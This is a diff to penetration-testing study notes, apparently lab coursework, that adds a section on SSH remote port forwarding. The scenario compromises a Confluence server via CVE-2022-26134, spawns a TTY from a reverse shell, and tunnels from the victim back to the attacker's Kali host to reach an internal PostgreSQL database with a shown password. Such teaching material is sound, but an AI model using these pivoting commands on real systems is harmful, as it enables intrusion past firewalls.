@@ -451,7 +451,7 @@ cat Provisioning.ps1
 
 
 
-## Dynamic Port Forward
+## Local Dynamic Port Forward
 - Created with the **-D** flag & only requires the arg IP:PORT we want to bind to.
 - From a single listening port on the SSH client, packets can be forwarded to any socket that the SSH server host has access to.
 - Listening port created is a SOCKS proxy server port.
@@ -585,6 +585,80 @@ proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
 
 > By default, Proxychains is configured with very high time-out values. This can make port scanning really slow.
 > Lowering the **tcp_read_time_out** and **tcp_connect_time_out** values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times.
+
+
+
+## Remote Port Forward
+
+Thus far, port forwarding has been unrestricted:
+- Been able to connect to bind ports
+- Been able to compromise SSH passwords/ keys to SSH *into* a network
+
+In the real world, hardware and software firewalls are prevalent and utilized to prevent most incoming network traffic.
+- Inbound connections are more easily and more aggressively restricted than outbound
+
+Outbound connections are more difficult to control than inbound connections. Most corporate networks will allow many types of common network traffic out - including SSH - for reasons of simplicity, usability, and business need. So while it likely won't be possible to connect to a port we bind to the network perimeter, it will often be possible to SSH out.
+- Like a reverse shell only with SSH port forwarding
+	- The listening port is bound to the SSH server.
+	- Packets are forwarded by the SSH client.
+
+#### Scenario
+- Compromise CONFLUENCE01 using CVE-2022-26134
+- Firewall is implemented at the perimeter
+	- Configured so that the only port we can connect to from our Kali machine is TCP 8090
+	- Can't create any port forward that requires opening the listening port on CONFLUENCE01.
+- Still want to enumerate the PostgreSQL database running on port 5432 on PGDATABASE01.
+- CONFLUENCE01 _does_ have an SSH client, and we can set up an SSH server on our Kali machine.
+- Connect from CONFLUENCE01 to our Kali machine over SSH.
+	- The listening TCP port 2345 is bound to the loopback interface on our Kali machine.
+	- Packets sent to this port are pushed by the Kali SSH server software through the SSH tunnel back to the SSH client on CONFLUENCE01.
+	- They are then forwarded to the PostgreSQL database port on PGDATABASE01
+- **CONFLUENCE01** - 192.168.193.63
+- **PGDATABASE01** - 10.4.193.215
+
+![](remote_port_forward_scenario.png)
+
+#### Execution
+
+- Enable the SSH server on Kali & verify SSH port is open
+```bash
+sudo systemctl start ssh
+
+udo ss -ntplu
+	Netid       State        Recv-Q       Send-Q             Local Address:Port                Peer Address:Port       Process  
+	...
+	tcp         LISTEN       0            128                      0.0.0.0:22                       0.0.0.0:*           users:(("sshd",pid=2153,fd=3))
+	tcp         LISTEN       0            128                         [::]:22                          [::]:*           users:(("sshd",pid=2153,fd=4))
+```
+	- SSH server is listening on port 22 for all interfaces for IPv4 & IPv6
+
+- Once we get a reverse shell from CONFLUENCE01, ensure a TTY shell, then create an SSH remote port forward as part of an SSH connection back to our Kali
+```bash
+# CONFLUENCE01 revshell
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+
+# SSH Remote Port Forward
+ssh -N -R 127.0.0.1:2345:10.4.193.215:5432 kali@192.168.45.196
+```
+	- 127.0.0.1:2345 - Listen on port **2345** on our Kali machine
+	- 10.4.193.215:5432 - Forward all traffic to PostgreSQL port on PGDATABASE01
+
+- Verify connection and exploit PGDATABASE01
+```bash
+ss -ntplu
+	Netid          State           Recv-Q          Send-Q                   Local Address:Port                      Peer Address:Port          Process
+	...
+	tcp            LISTEN          0               128                          127.0.0.1:2345                           0.0.0.0:*
+	...
+
+psql -h 127.0.0.1 -p 2345 -U postgres
+	Password for user postgres: D@t4basePassw0rd!
+	psql (16.2 (Debian 16.2-1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
+	SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
+	Type "help" for help.
+	
+	postgres=# 
+```
 
 
 
